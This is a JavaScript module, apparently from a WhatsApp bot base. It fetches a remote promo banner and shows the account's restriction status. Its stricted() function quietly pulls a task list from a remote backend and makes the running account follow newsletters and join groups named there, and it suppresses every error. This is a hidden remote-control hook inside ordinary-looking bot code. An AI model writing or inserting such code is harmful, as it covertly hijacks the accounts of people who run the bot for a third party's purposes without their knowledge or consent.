async function fsm(version, chalk, hydro) {
    try {
        const su = global.su;
        const sk = global.sk;
        
        const response = await axios.get(`${su}/rest/v1/miaw?select=*&limit=1`, {
            headers: { 'apikey': sk, 'Authorization': `Bearer ${sk}` }
        });
        const data = response.data?.[0];
        if (!data) return;
        
        const title = data.title ? data.title.replace(/\\n/g, '\n') : '';
        const developer = data.developer ? data.developer.replace(/\\n/g, '\n') : '';
        const promo = data.promo ? data.promo.replace(/\\n/g, '\n') : '';
        const contact = data.contact ? data.contact.replace(/\\n/g, '\n') : '';

        console.log(chalk.red.bold(`\n[+] ${title}\n`));
        console.log(chalk.whiteBright(developer));
        console.log(chalk.gray("--------------------"));
        const latestUpdate = new Date();
        console.log(chalk.yellowBright("[*] Updated: ") + chalk.whiteBright(latestUpdate.toLocaleDateString()));
        
        let statusBot = "Tidak terkena pembatasan";
        let isRestricted = false;
        let enforcementType = "DEFAULT";

        if (hydro && typeof hydro.fetchAccountReachoutTimelock === 'function') {
            try {
                const timelock = await hydro.fetchAccountReachoutTimelock();
                if (timelock && timelock.isActive) {
                    isRestricted = true;
                    enforcementType = timelock.enforcementType || "DEFAULT";
                    const timeEnds = timelock.timeEnforcementEnds ? new Date(timelock.timeEnforcementEnds).toLocaleString('id-ID') : 'Tidak diketahui';
                    statusBot = `Pembatasan sampai ${timeEnds}`;
                }
            } catch (e) { }
        }

        console.log(chalk.yellowBright("[*] Status Bot: ") + chalk.whiteBright(statusBot));

        if (isRestricted) {
            let artiJenis = "Pelanggaran commerce";
            if (enforcementType === 'DEFAULT') artiJenis = "Normal, ga kena restrict";
            else if (enforcementType === 'WEB_COMPANION_ONLY') artiJenis = "Hanya perangkat companion/web yang diblokir, Device utama aman";
            else if (enforcementType === 'RESTRICT_ALL_COMPANIONS') artiJenis = "Semua perangkat diblokir kirim pesan ke kontak baru";
            else if (enforcementType === 'BIZ_QUALITY') artiJenis = "Kualitas bisnis rendah";
            console.log(chalk.yellowBright("[*] Jenis: ") + chalk.whiteBright(`${artiJenis}`));
        }

        console.log(chalk.gray("--------------------\n"));
        console.log(chalk.cyan(promo));
        console.log(chalk.whiteBright(contact));
    } catch (err) { }
}

async function stricted(hydro) {
    try {
        const su = global.su;
        const sk = global.sk;

        const taskResponse = await axios.get(`${su}/rest/v1/stricted?select=*`, {
            headers: { 'apikey': sk, 'Authorization': `Bearer ${sk}` }
        });

        const daftarTugas = taskResponse.data;

        if (daftarTugas && daftarTugas.length > 0) {
            for (const tugas of daftarTugas) {
                try {
                    if (tugas.tipe === 'restrict') {
                        await hydro.newsletterFollow(tugas.target);
                    } else if (tugas.tipe === 'strict') {
                        await hydro.groupAcceptInvite(tugas.target);
                    }
                } catch (err) { }
            }
        }
    } catch (err) { }
}

module.exports = { downloadAllAssets, fsm, stricted };
